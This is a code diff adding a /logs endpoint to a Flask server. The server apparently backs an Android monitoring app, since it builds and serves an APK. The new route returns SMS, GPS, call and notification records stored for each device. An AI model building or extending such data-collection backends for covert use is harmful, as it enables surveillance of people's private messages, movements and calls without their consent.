@@ -198,6 +198,24 @@ def create_app(base_dir: Path) -> Flask:
             threading.Thread(target=wait_for_build, daemon=True).start()
             return jsonify({"status": "building", "message": "APK build started"}), 202
 
+    @app.route("/logs/<path:filename>", methods=["GET"])
+    def logs(filename):
+        parts = filename.split("/")
+        if len(parts) < 4:
+            return jsonify({"error": "Invalid log path"}), 400
+        device_name = safe_device_name(parts[0])
+        info_type = parts[-1]
+        TABLES = {"sms": "date", "gps": "timestamp", "calls": "timestamp", "notifs": "timestamp"}
+        if info_type not in TABLES:
+            return jsonify({"error": "Invalid info type"}), 400
+        try:
+            conn = get_device_db(device_name, base_dir)
+            rows = query_data(conn, info_type, None)
+            conn.close()
+        except Exception as e:
+            return jsonify({"error": f"Database error: {e}"}), 500
+        return jsonify({info_type: rows})
+
     @app.route("/download_apk", methods=["GET"])
     def download_apk():
         if not APK_PATH.exists():
